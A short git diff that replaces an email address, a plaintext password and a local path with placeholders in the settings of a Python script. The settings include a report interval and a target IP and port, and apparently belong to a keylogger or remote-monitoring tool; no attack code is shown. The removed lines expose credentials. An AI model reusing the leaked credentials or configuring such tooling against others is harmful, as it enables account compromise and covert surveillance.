@@ -10,9 +10,9 @@ import socket
 import os
 
 SEND_REPORT_EVERY = 60  # in seconds/1 minute.
-EMAIL_ADDRESS = "expertsolutionses@outlook.com"
-EMAIL_PASSWORD = "jay@2019PT"
-OUTPUT_FOLDER = "/home/preston/Mine/Software Engineering/GitProjects/Mission/strg."
+EMAIL_ADDRESS = "example@outlook.com"
+EMAIL_PASSWORD = "password"
+OUTPUT_FOLDER = "path/to/strg."
 TARGET_IP = '192.168.0.23'  #IP address of the target machine
 TARGET_PORT = 12345
 
